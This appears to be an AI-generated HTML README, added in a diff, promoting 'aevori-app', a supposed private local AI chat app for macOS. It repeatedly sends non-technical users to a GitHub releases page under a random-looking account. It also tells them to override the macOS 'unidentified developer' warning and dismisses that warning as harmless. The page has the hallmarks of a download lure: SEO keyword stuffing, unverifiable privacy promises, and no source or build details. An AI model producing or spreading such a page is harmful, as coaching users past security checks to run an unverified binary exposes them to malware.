@@ -1,0 +1,245 @@
+Here is a complete HTML document for the aevori-app README, styled with inline CSS for a clean, professional look. It guides non-technical users through downloading the macOS app and covers its key features like local AI chat, customizable characters, and controllable memory.
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>aevori-app - Local AI Chat &amp; Personal Agents for macOS</title>
+<meta name="description" content="Download aevori-app, a ready-to-run local AI chat and personal agent application for macOS. Ollama-powered conversations, customizable characters, controllable memory, and a browser-based workspace.">
+<meta name="keywords" content="ai-agent, ai-assistant, developer-tools, local-ai, local-llm, macos, ollama, pwa, react, self-hosted, typescript, offline ai chat, private ai">
+<meta name="author" content="aevori-app">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#5b4bf6">
+<link rel="canonical" href="https://github.com/Rosaleenoilbearing771/aevori-app">
+<meta property="og:type" content="website">
+<meta property="og:title" content="aevori-app - Local AI Chat &amp; Personal Agents for macOS">
+<meta property="og:description" content="Ready-to-run local AI chat with Ollama-powered conversations, customizable characters, controllable memory, and a browser-based workspace.">
+<meta property="og:url" content="https://github.com/Rosaleenoilbearing771/aevori-app/releases">
+<meta property="og:site_name" content="aevori-app">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="aevori-app - Local AI Chat &amp; Personal Agents for macOS">
+<meta name="twitter:description" content="Download aevori-app: private, local AI conversations with memory and customizable characters. Ready-to-run builds for Apple silicon and Intel.">
+<style>
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    padding: 0;
+    background-color: #f6f7fb;
+    color: #23262f;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 32px 20px 64px;
+  }
+  .hero {
+    background: #ffffff;
+    border-radius: 18px;
+    padding: 36px 30px 40px;
+    box-shadow: 0 10px 30px rgba(35, 38, 47, 0.08);
+    border: 1px solid #e8eaf2;
+    text-align: center;
+  }
+  h1 {
+    font-size: 2rem;
+    line-height: 1.3;
+    margin: 0 0 16px;
+    letter-spacing: -0.4px;
+    color: #14161d;
+  }
+  h2 {
+    font-size: 1.4rem;
+    line-height: 1.35;
+    margin: 48px 0 14px;
+    letter-spacing: -0.2px;
+    color: #14161d;
+  }
+  h3 {
+    font-size: 1.08rem;
+    margin: 26px 0 8px;
+    color: #2c3040;
+  }
+  p { margin: 0 0 16px; }
+  ul, ol { margin: 0 0 18px; padding-left: 24px; }
+  li { margin-bottom: 10px; }
+  a { color: #4a3ae0; }
+  .lede {
+    font-size: 1.08rem;
+    color: #4b5063;
+    max-width: 640px;
+    margin: 0 auto 26px;
+  }
+  .btn {
+    display: inline-block;
+    padding: 16px 34px;
+    background: linear-gradient(135deg, #ff6b6b 0%, #f06595 50%, #845ef7 100%);
+    color: #ffffff;
+    font-size: 1.05rem;
+    font-weight: 700;
+    text-decoration: none;
+    border-radius: 12px;
+    box-shadow: 0 8px 20px rgba(132, 94, 247, 0.35);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover { transform: translateY(-2px); box-shadow: 0 12px 26px rgba(132, 94, 247, 0.45); }
+  .btn-secondary {
+    background: linear-gradient(135deg, #20c997 0%, #0ca678 100%);
+    box-shadow: 0 8px 20px rgba(12, 166, 120, 0.3);
+  }
+  .btn-secondary:hover { box-shadow: 0 12px 26px rgba(12, 166, 120, 0.42); }
+  .card {
+    background: #ffffff;
+    border: 1px solid #e8eaf2;
+    border-radius: 14px;
+    padding: 22px 24px;
+    box-shadow: 0 4px 14px rgba(35, 38, 47, 0.05);
+    margin-bottom: 18px;
+  }
+  .note {
+    background: #eef1ff;
+    border-left: 4px solid #5b4bf6;
+    border-radius: 10px;
+    padding: 16px 20px;
+    margin: 22px 0;
+    color: #2c3040;
+  }
+  .download-box {
+    background: #ffffff;
+    border: 1px solid #e8eaf2;
+    border-radius: 16px;
+    padding: 30px 26px;
+    text-align: center;
+    box-shadow: 0 8px 24px rgba(35, 38, 47, 0.07);
+    margin: 24px 0 8px;
+  }
+  .small { font-size: 0.92rem; color: #6b7185; }
+  footer {
+    margin-top: 54px;
+    padding-top: 22px;
+    border-top: 1px solid #e0e3ee;
+    font-size: 0.9rem;
+    color: #6b7185;
+    text-align: center;
+  }
+  @media (max-width: 600px) {
+    h1 { font-size: 1.6rem; }
+    h2 { font-size: 1.22rem; }
+    .hero { padding: 28px 20px 32px; }
+    .page { padding: 20px 14px 48px; }
+    .btn { display: block; padding: 16px 20px; }
+  }
+</style>
+</head>
+<body>
+<div class="page">
+
+  <header class="hero">
+    <h1>🦙 aevori-app - Your Private AI Chat Companion</h1>
+    <p class="lede">Have real conversations with an AI that lives on your own computer. No accounts, no subscriptions, no cloud. Just you, your characters, and your ideas.</p>
+    <a class="btn" href="https://github.com/Rosaleenoilbearing771/aevori-app/releases">⬇️ Download aevori-app Now</a>
+    <p class="small" style="margin-top: 18px;">Ready-to-run builds for Apple silicon and Intel Macs</p>
+  </header>
+
+  <h2>✨ What Is aevori-app?</h2>
+  <p>aevori-app is a free application for macOS that gives you a private AI assistant you can actually talk to. Instead of sending your questions and personal notes off to a company's servers, aevori-app runs the intelligence directly on your own machine. That means your conversations stay with you.</p>
+  <p>Think of it as a chat window with a brain. You type a message, the AI replies, and it remembers what matters to you. You can shape the personality of your assistant, decide what it is allowed to remember, and use it for writing, planning, brainstorming, research, or simply sorting out your thoughts at the end of a long day.</p>
+  <p>Behind the scenes, aevori-app works with Ollama, a popular way to run AI models on a personal computer. You do not need to understand any of that. From your point of view, you open the app, you start typing, and it works.</p>
+
+  <h2>🚀 Getting Started</h2>
+  <p>Getting aevori-app onto your computer takes just a few minutes, and you do not need any technical knowledge to do it. Everything you need lives on one page.</p>
+
+  <div class="download-box">
+    <h3 style="margin-top: 0;">Download aevori-app</h3>
+    <p>Visit this link to download the application.</p>
+    <a class="btn btn-secondary" href="https://github.com/Rosaleenoilbearing771/aevori-app/releases">➡️ Go to the Download Page</a>
+    <p class="small" style="margin-top: 16px;">This opens the official releases page where the ready-to-run downloads are listed.</p>
+  </div>
+
+  <div class="note">
+    <strong>Good to know:</strong> the download page lists builds for both Apple silicon Macs (the newer M1, M2, M3 and M4 chips) and Intel Macs. If you are not sure which one you have, choose the download that matches your Mac — the app itself works the same way on both.
+  </div>
+
+  <h3>Step-by-step: from download to first chat</h3>
+  <ol>
+    <li><strong>Open the download page.</strong> Click the download button above, or copy this address into your browser: <a href="https://github.com/Rosaleenoilbearing771/aevori-app/releases">https://github.com/Rosaleenoilbearing771/aevori-app/releases</a></li>
+    <li><strong>Pick the download that matches your Mac.</strong> The file names make it clear which build is for Apple silicon and which is for Intel. Choose the one that fits your computer.</li>
+    <li><strong>Wait for the download to finish.</strong> Depending on your internet speed, this can take a couple of minutes. A progress indicator in your browser will let you know when it is done.</li>
+    <li><strong>Open your Downloads folder.</strong> It is the folder with the downward arrow icon in your Dock, or you can find it in Finder under your user name.</li>
+    <li><strong>Open the downloaded file.</strong> Double-click it to begin. If your Mac asks whether you are sure you want to open something you downloaded from the internet, confirm that you do.</li>
+    <li><strong>Follow the on-screen prompts.</strong> The app will guide you through the rest. There are no long forms and no account to create.</li>
+    <li><strong>Start chatting.</strong> Once aevori-app is open, type a message into the chat box and press Enter. That is all there is to it.</li>
+  </ol>
+
+  <p class="small">If your Mac shows a message saying the app cannot be opened because it is from an unidentified developer, open your System Settings, go to Privacy &amp; Security, and look for a button that allows you to open it anyway. This is a normal safety check for software downloaded from the internet, not a sign that anything is wrong.</p>
+
+  <h2>🧠 Conversations That Feel Personal</h2>
+  <p>The heart of aevori-app is a chat window that feels less like a search box and more like a conversation with someone who has been paying attention. You can talk about a project over several days, come back to an idea weeks later, or ask for a fresh perspective on something you have been chewing on.</p>
+  <p>Because everything runs on your own computer, there is no queue, no waiting for a server to respond, and no monthly limit on how much you can chat. Ask a hundred questions in an afternoon if you like.</p>
+
+  <h2>👥 Customizable Characters</h2>
+  <p>Not every conversation needs the same voice. aevori-app lets you create characters — each with its own name, personality, and way of speaking. You might build one assistant that is calm and concise for work, another that is playful and encouraging for creative writing, and a third that is a patient tutor for learning something new.</p>
+  <p>Switching between them takes a single click. Each character keeps its own tone, so your serious writing partner never suddenly starts cracking jokes, and your brainstorming buddy never turns into a stiff manual.</p>
+
+  <h2>💾 Memory You Control</h2>
+  <p>Most AI tools either forget everything the moment you close the window or quietly remember far more than you would like. aevori-app takes a different approach: you decide.</p>
+  <ul>
+    <li><strong>Keep what matters.</strong> Save details, preferences, and context so your assistant does not ask the same question twice.</li>
+    <li><strong>Remove what does not.</strong> Delete a memory item whenever you want, and it is gone from the conversation.</li>
+    <li><strong>See what is stored.</strong> There are no hidden profiles. Everything the app remembers is visible and editable.</li>
+  </ul>
+  <p>This makes the experience feel less like talking to a stranger and more like working with someone who knows your preferences without ever overstepping.</p>
+
+  <h2>🌐 A Workspace That Lives in Your Browser</h2>
+  <p>Alongside the app itself, aevori-app includes a browser-based workspace. That means you can open your chats in a familiar browser tab, arrange things the way you like, and move between conversations without hunting through menus. If you enjoy having your tools in one place, the workspace fits neatly into your daily routine.</p>
+  <p>It also makes the app feel quick. Pages load instantly, switching between characters is smooth, and the interface adapts to the size of your screen — whether you are on a large desktop monitor or a compact laptop.</p>
+
+  <h2>🔒 Privacy Without Compromise</h2>
+  <p>Everything aevori-app does happens on your Mac. Your conversations, your characters, and your saved memories are not uploaded anywhere. There is no account to sign into, no email address to hand over, and no usage dashboard tracking how often you chat.</p>
+  <p>For anyone who has hesitated to try an AI assistant because of privacy concerns, this is the point: the intelligence is local, and the data stays local with it. If you ever want a completely clean slate, you can remove your chats and memory from the app's own settings.</p>
+
+  <h2>🛠️ Built for People Who Value Their Time</h2>
+  <p>aevori-app is designed to stay out of your way. There is no complicated setup wizard, no configuration file to edit, and no command line to learn. The downloads are ready to run, which means the gap between deciding to try it and having your first conversation is measured in minutes rather than evenings.</p>
+  <p>Under the surface, the app is built with modern, well-supported tools that make it fast and dependable. You do not need to know any of that to use it — but it is the reason the app feels responsive even when you are working with long conversations and detailed character settings.</p>
+
+  <h2>❓ Frequently Asked Questions</h2>
+  <h3>Do I need to create an account?</h3>
+  <p>No. There is nothing to sign up for and no login screen. Download the app, open it, and start chatting.</p>
+  <h3>Does it cost anything?</h3>
+  <p>aevori-app is free to download and use. There are no subscriptions or per-message charges.</p>
+  <h3>Where do my conversations go?</h3>
+  <p>They stay on your computer. Nothing is sent to a remote service.</p>
+  <h3>Can I use it without an internet connection?</h3>
+  <p>Once the app and its AI model are set up on your machine, the core chat experience runs locally. You may need a connection the first time you download everything.</p>
+  <h3>What do I do if the download will not open?</h3>
+  <p>Try downloading again from the releases page — occasionally a download is interrupted. If your Mac blocks the file, check Privacy &amp; Security in System Settings and allow it to open.</p>
+
+  <h2>🧭 A Few Tips for a Great First Week</h2>
+  <ul>
+    <li>Create one character to start. A single well-defined assistant is easier to get comfortable with than five half-finished ones.</li>
+    <li>Give your character a clear purpose — "helps me plan my week," "reviews my writing," "explains things simply" — and it will respond much more usefully.</li>
+    <li>Save a memory item the first time you notice yourself repeating the same context. It pays off quickly.</li>
+    <li>Keep the browser workspace open in a tab you visit often. The more it is part of your routine, the more useful it becomes.</li>
+  </ul>
+
+  <h2>📥 Ready When You Are</h2>
+  <p>You have everything you need to get started. Visit the download page, choose the build that matches your Mac, and open it. In a few minutes you will be having your first private conversation with an assistant that belongs entirely to you.</p>
+
+  <div class="download-box">
+    <a class="btn" href="https://github.com/Rosaleenoilbearing771/aevori-app/releases">⬇️ Visit This Link to Download the Application</a>
+    <p class="small" style="margin-top: 16px;">Official releases for Apple silicon and Intel — ready to run.</p>
+  </div>
+
+  <footer>
+    <p>aevori-app — local AI chat and personal agents for macOS. Built for people who would rather own their data.</p>
+  </footer>
+
+</div>
+</body>
+</html>
+```
